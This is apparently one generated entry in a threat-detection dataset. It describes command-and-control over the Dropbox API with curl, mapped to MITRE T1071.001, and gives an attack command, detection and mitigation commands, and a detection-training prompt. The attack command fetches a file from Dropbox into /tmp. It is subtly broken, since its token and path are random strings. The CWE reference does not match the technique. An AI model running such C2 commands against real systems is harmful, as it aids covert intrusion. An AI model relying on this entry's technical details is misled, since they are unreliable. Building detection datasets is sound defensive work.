---
type: campaign
scenario_id: 462
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with Dropbox API for C2.

## Threat Description
Using curl to communicate with Dropbox API for C2.

## Attack Command
```
curl -H "Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://api.dropboxapi.com/2/files/download --data '{"path": "/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"}' -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl Dropbox: `ps aux | grep curl | grep dropboxapi.com`; Network traffic: `tcpdump -i any host api.dropboxapi.com`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block Dropbox API: `iptables -A OUTPUT -d api.dropboxapi.com -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via Dropbox API by analyzing HTTP headers, Dropbox API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
